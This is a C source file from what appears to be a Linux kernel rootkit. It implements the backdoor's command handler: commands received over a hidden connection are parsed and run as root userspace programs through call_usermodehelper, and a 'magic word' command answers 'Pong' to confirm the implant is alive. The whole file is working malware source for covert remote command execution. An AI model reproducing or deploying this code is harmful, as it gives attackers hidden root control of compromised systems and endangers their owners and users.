#include "cmd.h"
#include "backdoor.h"
#include "rootkit.h"

extern struct kbackdoor_t *bkdoor;

static int parse_argv(char *cmd, char ***dest) {
  int argc = 0;
  char *ptr, *token;
  ptr = cmd;
  printk(KERN_INFO "Parsing arguments for %s\n", cmd);
  // TODO: Implement support for quotes
  while ((token = strsep(&ptr, " ")) != NULL) {
    printk(KERN_INFO "Token: %s\n", token);
    (*dest)[argc] = token;
    argc++;
  }
  (*dest)[argc] = NULL;
  printk(KERN_INFO "Argc: %d\n", argc);
  return argc;
}

static void cmd_userspace_shell(char *cmd, size_t n)
{
  static char *envp[] = {
    "HOME=/",
    "TERM=linux",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  char **argv = kmalloc(sizeof(char *) * n, GFP_USER);
  printk(KERN_INFO "Running shell command\n");
  parse_argv(cmd + strlen(CMD_SHELL) + 1, &argv);
  printk(KERN_INFO "Parsing successful\n");
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
  printk(KERN_INFO "Ran command\n");
  kfree(argv);
}

static void cmd_magic(char *cmd, size_t n)
{
  debug("Received magic word\n");
  if (backdoor_send(bkdoor->conn, "Pong\n", 5) < 0) {
    debug("Can't send response!\n");
  }
}

int handle_cmd(char *cmd, size_t len)
{
  // Match cases against commands
  if (strncmp(cmd, CMD_SHELL, strlen(CMD_SHELL)) == 0) {
    cmd_userspace_shell(cmd, len);
  }
  if (strncmp(cmd, CMD_MAGIC, strlen(CMD_MAGIC)) == 0) {
    cmd_magic(cmd, len);
  }
  return 0;
}
